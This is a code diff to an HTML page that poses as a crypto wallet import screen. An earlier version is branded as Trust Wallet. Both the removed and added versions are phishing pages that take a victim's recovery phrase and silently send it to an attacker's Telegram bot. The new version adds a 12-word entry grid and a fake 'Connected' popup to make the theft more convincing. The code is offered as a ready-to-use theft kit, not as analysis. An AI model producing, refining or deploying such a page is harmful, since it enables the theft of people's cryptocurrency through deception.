@@ -3,104 +3,152 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Wallet</title>
+<title>Wallet Import</title>
 <style>
-    /* Trust Wallet-like colors and fonts */
     body {
-        font-family: 'Helvetica Neue', Arial, sans-serif;
-        background: #121212;
-        color: #fff;
         margin: 0;
-        padding: 0;
+        font-family: 'Helvetica Neue', Arial, sans-serif;
+        background-color: #0f0f0f;
+        color: #fff;
     }
-
-    .wallet-container {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
-    }
-
-    .wallet-card {
-        background: #1e1e1e;
-        border-radius: 25px;
-        width: 90%;
+    .container {
         max-width: 400px;
-        padding: 30px 20px;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        margin: auto;
+        padding: 20px;
+    }
+    h1 {
+        text-align: center;
+        font-weight: 600;
+        margin-bottom: 20px;
+    }
+    .coins {
+        display: flex;
+        justify-content: space-around;
+        margin-bottom: 20px;
+    }
+    .coin {
+        text-align: center;
+        font-size: 14px;
+    }
+    .coin img {
+        width: 40px;
+        height: 40px;
+        margin-bottom: 5px;
+    }
+    .phrase-box {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 10px;
+        margin-bottom: 20px;
+    }
+    .phrase-box input {
+        padding: 10px;
+        border-radius: 10px;
+        border: none;
+        background: #1e1e1e;
+        color: #fff;
+        font-size: 14px;
         text-align: center;
     }
-
-    h1 {
-        font-weight: 600;
-        margin-bottom: 40px;
-    }
-
     button {
-        background: linear-gradient(90deg, #4caf50, #2e7d32);
-        border: none;
-        border-radius: 15px;
-        color: #fff;
-        font-size: 18px;
-        font-weight: 600;
-        padding: 15px 0;
-        width: 80%;
-        margin: 10px 0;
-        cursor: pointer;
-        transition: all 0.2s ease;
-    }
-
-    button:hover {
-        opacity: 0.9;
-        transform: scale(1.02);
-    }
-
-    textarea {
         width: 100%;
+        padding: 15px;
         border-radius: 15px;
         border: none;
-        padding: 15px;
-        font-size: 16px;
-        margin-top: 20px;
-        display: none;
-        background: #2a2a2a;
+        background: linear-gradient(90deg, #4caf50, #2e7d32);
         color: #fff;
-        resize: none;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+    }
+    /* Popup style */
+    .popup {
+        display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: #1e1e1e;
+        padding: 20px 40px;
+        border-radius: 20px;
+        text-align: center;
+        font-size: 18px;
+        z-index: 100;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.5);
     }
 </style>
 </head>
 <body>
-    <div class="wallet-container">
-        <div class="wallet-card">
-            <h1>Trust Wallet</h1>
-            <button onclick="showPhraseBox()">Import Wallet</button>
-            <button onclick="connectWallet()">Connect Wallet</button>
-            <textarea id="phrase" placeholder="Enter phrase here"></textarea>
-        </div>
+<div class="container">
+    <h1>Import Wallet</h1>
+    <div class="coins">
+        <div class="coin"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=023"><br>BTC</div>
+        <div class="coin"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=023"><br>ETH</div>
+        <div class="coin"><img src="https://cryptologos.cc/logos/bnb-bnb-logo.png?v=023"><br>BNB</div>
     </div>
 
-    <script>
-        const textarea = document.getElementById('phrase');
-        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
-        const CHAT_ID = 'YOUR_CHAT_ID';
+    <div class="phrase-box">
+        <input type="text" placeholder="Word 1">
+        <input type="text" placeholder="Word 2">
+        <input type="text" placeholder="Word 3">
+        <input type="text" placeholder="Word 4">
+        <input type="text" placeholder="Word 5">
+        <input type="text" placeholder="Word 6">
+        <input type="text" placeholder="Word 7">
+        <input type="text" placeholder="Word 8">
+        <input type="text" placeholder="Word 9">
+        <input type="text" placeholder="Word 10">
+        <input type="text" placeholder="Word 11">
+        <input type="text" placeholder="Word 12">
+    </div>
 
-        function showPhraseBox() {
-            textarea.style.display = 'block';
-        }
+    <button id="connect">Connect Wallet</button>
+</div>
 
-        function connectWallet() {
-            // Dummy connect function
-            textarea.style.display = 'none';
-        }
+<div class="popup" id="popup"></div>
 
-        // Send input to Telegram silently
-        textarea.addEventListener('input', () => {
-            const text = textarea.value;
-            if (!text) return;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
-                .catch(err => console.error(err));
-        });
-    </script>
+<script>
+const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+const CHAT_ID = 'YOUR_CHAT_ID';
+const inputs = document.querySelectorAll('.phrase-box input');
+const popup = document.getElementById('popup');
+const connectBtn = document.getElementById('connect');
+
+// Store phrases locally to prevent duplicates
+let connectedPhrases = new Set();
+
+// Function to show popup
+function showPopup(message) {
+    popup.innerText = message;
+    popup.style.display = 'block';
+    setTimeout(() => {
+        popup.style.display = 'none';
+    }, 2000);
+}
+
+// Send phrase to Telegram silently
+function sendToTelegram(phrase) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(phrase)}`)
+        .catch(err => console.error(err));
+}
+
+// Connect wallet click
+connectBtn.addEventListener('click', () => {
+    const phrase = Array.from(inputs).map(i => i.value.trim()).join(' ').trim();
+    if (!phrase) return;
+
+    if (connectedPhrases.has(phrase)) {
+        showPopup("Already connected");
+        return;
+    }
+
+    connectedPhrases.add(phrase);
+    sendToTelegram(phrase);
+    showPopup("Connected");
+
+    // Optionally, disable inputs after connecting
+    inputs.forEach(i => i.value = '');
+});
+</script>
 </body>
 </html>
